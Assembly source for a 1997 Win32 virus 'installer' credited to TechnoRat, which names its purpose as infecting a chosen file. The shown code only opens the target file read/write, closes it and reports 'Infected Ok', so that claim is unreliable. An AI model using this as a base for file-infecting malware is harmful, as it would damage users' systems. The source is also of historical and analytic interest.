; =========================================================
; This is installer for "95-th Harrier from DarkLand"
;                             (C) 11-Aug-1997y by TechnoRat
; =========================================================
		.386
		.Model	Flat,StdCall
; ---------------------------------------------------------
Extrn		MessageBoxA:Proc		; Imported functions
Extrn		CreateFileA:Proc
Extrn		CloseHandle:Proc
Extrn		GetStdHandle:Proc
Extrn		WriteFile:Proc
Extrn		GetCommandLineA:Proc

; ---------------------------------------------------------
Cr		Equ	<0Dh,0Ah>		; Just CR/LF

		.Data
OutHandle	Dd	?			; General Variables
ProcessedBytes	Dd	?
FileName	Dd	?
FileNameLen	Dd	?

HelloMsg	Label	Byte
Db '(C) 11-Aug-1997y by TechnoRat "95-th Harrier from DarkLand" Installer!',Cr
Db '                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~',Cr
HelloMsgLen	=	$-HelloMsg

UsageMsg	Label	Byte
Db 'Usage: 95INST.EXE File_To_Infect',Cr
Db '       - infect desired ;-) file.',Cr
UsageMsgLen	=	$-UsageMsg

OkMsg		Label	Byte
Db ' - Infected Ok.',Cr
OkMsgLen	=	$-OkMsg

BadMsg		Label	Byte
Db ' - Error infecting!',Cr
BadMsgLen	=	$-BadMsg

; ---------------------------------------------------------
		.Code				; Party goes to begin. . .
Start:		Push	-11			; Get StdOut Handle
		Call	GetStdHandle
		Mov	OutHandle,EAx

		Push	0h			; Some greetz
		Push	Offset ProcessedBytes
		Push	HelloMsgLen
		Push	Offset HelloMsg
		Push	OutHandle
		Call	WriteFile

		Call	GetCommandLineA
NextChar:	Cmp	Byte Ptr [EAx],0h	; Parse string to
		Je	DoneParsing		; parameters
		Cmp	Byte Ptr [EAx],' '
		Jbe	FirstParam
		Inc	EAx
		Jmp	NextChar
FirstParam:	Cmp	Byte Ptr [EAx],0h
		Je	DoneParsing
		Cmp	Byte Ptr [EAx],' '
		Ja	DoneParsing
		Inc	EAx
		Jmp	FirstParam
DoneParsing:	Xor	ECx,ECx
		Push	EAx
CalcLen:	Cmp	Byte Ptr [EAx],0h
		Je	Analyze
		Inc	ECx
		Inc	EAx
		Jmp	CalcLen
Analyze:	Pop	EAx
		Or	ECx,ECx
		Jnz	Infect
		Push	0h			; No parameters
		Push	Offset ProcessedBytes	; Show Usage Hint
		Push	UsageMsgLen
		Push	Offset UsageMsg
		Push	OutHandle
		Call	WriteFile
		Ret

Infect:		Mov	FileName,EAx		; Store for future use
		Mov	FileNameLen,ECx

		Push	0
		Push	80h+10000000h		; FAN+FFRA
		Push	3h			; OE
		Push	0
		Push	1h			; FSR
		Push	80000000h+40000000h	; GR/GW
		Push	EAx
		Call	CreateFileA		; Try to open distribute file
		Mov	EDx,Offset BadMsg
		Mov	ECx,BadMsgLen
		Cmp	EAx,-1
		Je	DoneInfecting
		Push	EAx
		Call	CloseHandle		; Close if success
		Mov	EDx,Offset OkMsg
		Mov	ECx,OkMsgLen

DoneInfecting:	Push	EDx			; Show file name
		Push	ECx
		Push	0h
		Push	Offset ProcessedBytes
		Push	FileNameLen
		Push	FileName
		Push	OutHandle
		Call	WriteFile
		Pop	ECx
		Pop	EDx

		Push	0h			; And infecting status.
		Push	Offset ProcessedBytes
		Push	ECx
		Push	EDx
		Push	OutHandle
		Call	WriteFile
		Ret
; ---------------------------------------------------------
		End	Start
; =========================================================
